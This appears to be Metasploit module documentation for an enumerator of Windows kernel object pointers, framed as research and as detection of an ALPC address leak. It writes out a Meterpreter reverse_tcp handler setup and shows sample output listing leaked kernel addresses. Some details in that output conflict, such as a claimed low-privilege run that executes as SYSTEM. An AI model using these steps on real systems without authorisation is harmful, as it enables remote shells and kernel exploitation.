# Windows Kernel Pointer Exposure Enumerator

## Vulnerable Application

This module enumerates kernel object pointers exposed via `NtQuerySystemInformation` with the `SystemExtendedHandleInformation` class (info class 64). It works on all x64 versions of Windows 10 and 11, regardless of patch level, as it does not exploit a vulnerability but rather enumerates information already accessible to user-mode processes.

The module is particularly useful for detecting CVE-2026-20805, an information disclosure vulnerability where ALPC port handles leak kernel object addresses. However, it serves a broader purpose as a general kernel pointer enumeration tool for research and educational purposes.

### Tested Windows Versions

- Windows 10 2004 (Build 19041) ✓
- Windows 10 20H2 (Build 19042) ✓
- Windows 10 21H1 (Build 19043) ✓
- Windows 10 21H2 (Build 19044) ✓
- Windows 10 22H2 (Build 19045) ✓
- Windows 11 21H2 (Build 22000) ✓
- Windows 11 22H2 (Build 22621) ✓
- Windows 11 23H2 (Build 22631) ✓

### Requirements

- A Meterpreter session on a target x64 Windows system
- No special privileges required (works from low-privileged user contexts)

## Verification Steps

1. Obtain a Meterpreter session on a Windows x64 target:
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse\_tcp
msf6 exploit(multi/handler) > set LHOST <your\_ip>
msf6 exploit(multi/handler) > run
[\*] Meterpreter session 1 opened
2. Background the session and load the module:
meterpreter > background
msf6 > use post/windows/gather/windows\_kernel\_pointer\_enum
3. Set the session ID and run the module:
msf6 post(windows/gather/windows\_kernel\_pointer\_enum) > set SESSION 1
msf6 post(windows/gather/windows\_kernel\_pointer\_enum) > run

## Options

### MAX\_HANDLES

Maximum number of handles to process (0 = unlimited). Default: `50000`

This option limits the number of handles processed to prevent excessive memory usage or timeout on systems with very large handle tables. On typical Windows systems, the handle count ranges from 30,000 to 100,000. Setting this to 0 will process all handles, but may increase runtime.

### TIMEOUT

Maximum time in seconds to wait for enumeration to complete. Default: `30`

The enumeration process can take longer on systems with very large handle tables. Increase this value if you encounter timeout errors.

### EXPORT\_CSV

Export results to a CSV file. Default: `null`

When set to `true`, the module will save the complete pointer data to a CSV file in Metasploit's loot directory. The file includes process ID, type index, type hint, handle value, access mask, and kernel address for each pointer found.

## Scenarios

### Basic Enumeration on Windows 10

This scenario demonstrates a standard run of the module on a Windows 10 system, showing the complete output including buffer size negotiation and result analysis.

```javascript
msf6 post(windows/gather/windows_kernel_pointer_enum) > set SESSION 1
SESSION => 1
msf6 post(windows/gather/windows_kernel_pointer_enum) > run

[*] Windows Kernel Pointer Exposure Enumerator
================================================================================
[*] Target: DESKTOP-KQAH94Q
[*] OS: Windows 10 2004 (10.0 Build 19041).
[*] Arch: x64
[*] User: NT AUTHORITY\SYSTEM
[*] Enumerating kernel object pointers...
[*] Attempt 1: Trying buffer size 1048576 bytes
[*] Buffer too small, need 1283696 bytes
[*] Attempt 2: Trying buffer size 1283696 bytes
[*] Buffer too small, need 1283776 bytes
[*] Attempt 3: Trying buffer size 1283776 bytes
[+] Success with buffer size 1283776
[+] System has 32094 total handles
[*] Processing 32094 handles...
[*]   Processed 10000/32094 handles (found 2000 kernel addresses)...
[*]   Processed 20000/32094 handles (found 4000 kernel addresses)...
[+] Processed 26745 handles, found 5349 kernel addresses
[+] Enumerated 5349 kernel object pointers

================================================================================
KERNEL POINTER EXPOSURE RESULTS
================================================================================

SUMMARY STATISTICS:
  Total pointers: 5349
  Unique addresses: 5087
  Address range: 0xffffa80a92c637d0 - 0xffffe00afba7e660

OBJECT TYPE DISTRIBUTION:
  Type 7 (Process): 118 pointers (2.21%)
  Type 8 (Thread): 174 pointers (3.25%)
  Type 16 (Key): 1201 pointers (22.45%)
  Type 24 (File): 19 pointers (0.36%)
  Type 35 (ALPC Port): 137 pointers (2.56%)
  Type 36 (ALPC Port): 365 pointers (6.82%)
  Type 37 (ALPC Port): 287 pointers (5.37%)
  Type 42 (ALPC Section): 165 pointers (3.08%)
  Type 44 (ALPC): 506 pointers (9.46%)
  Type 46 (ALPC): 284 pointers (5.31%)

--------------------------------------------------------------------------------
ALPC OBJECT ANALYSIS (Type Indices 32-48)
--------------------------------------------------------------------------------
  Total ALPC pointers: 1755
  Found in 69 processes

  Processes with ALPC pointers:
    System (PID: 4): 175 ALPC pointers
    WinStore.App.exe (PID: 788): 129 ALPC pointers
    explorer.exe (PID: 4080): 122 ALPC pointers
    dwm.exe (PID: 964): 55 ALPC pointers
    lsass.exe (PID: 632): 43 ALPC pointers

  Sample ALPC kernel addresses:
    1. Type 44: 0xffffa80a92d182d0
    2. Type 44: 0xffffa80a92cff450
    3. Type 44: 0xffffa80a92d19c50
    4. Type 37: 0xffffe00af5459190
    5. Type 44: 0xffffa80a9422bbd0

================================================================================
[+] Results exported to: /home/kali/.msf4/loot/20260302132544_default_192.168.91.133_windows.kernel.p_795889.txt (250.32 KB)
[*] Post module execution completed
```

### Exporting Results to CSV

This scenario demonstrates exporting the complete dataset to CSV for further analysis.

```javascript
msf6 post(windows/gather/windows_kernel_pointer_enum) > set EXPORT_CSV true
EXPORT_CSV => true
msf6 post(windows/gather/windows_kernel_pointer_enum) > run

[+] Results exported to: /home/kali/.msf4/loot/20260302132544_default_192.168.91.133_windows.kernel.p_795889.txt (250.32 KB)
```

View the first 10 lines of the CSV:

```javascript
$ cat /home/kali/.msf4/loot/20260302132544_default_192.168.91.133_windows.kernel.p_795889.txt | head -n 10

PID,TypeIndex,TypeHint,Handle,Access,Address
4,7,Process,0x4,0x7777777,0xffffe00af4697040
4,3,Unknown,0x1c,0x3600017,0xffffa80a92c637d0
4,16,Key,0x34,0x7600003,0xffffe00af4674a20
4,8,Thread,0x4c,0x7777777,0xffffe00af47bd080
4,44,ALPC,0x64,0x400031,0xffffa80a92d182d0
4,7,Process,0x7c,0x10052,0xffffe00af9ab12c0
4,44,ALPC,0x94,0x3600077,0xffffa80a92cff450
4,44,ALPC,0xac,0x3600077,0xffffa80a92d19c50
4,44,ALPC,0xc4,0x20,0xffffa80a9422b540
```

### 

## Notes

- **CRASH\_SAFE**: This module performs read-only operations and does not modify any kernel memory
- **No special privileges required**: Works from any user context, including low-privileged users
- **Educational purpose**: Designed for research and learning about Windows kernel internals
- **Object type hints**: Type names are inferred from empirical observation and may not be 100% accurate across all Windows versions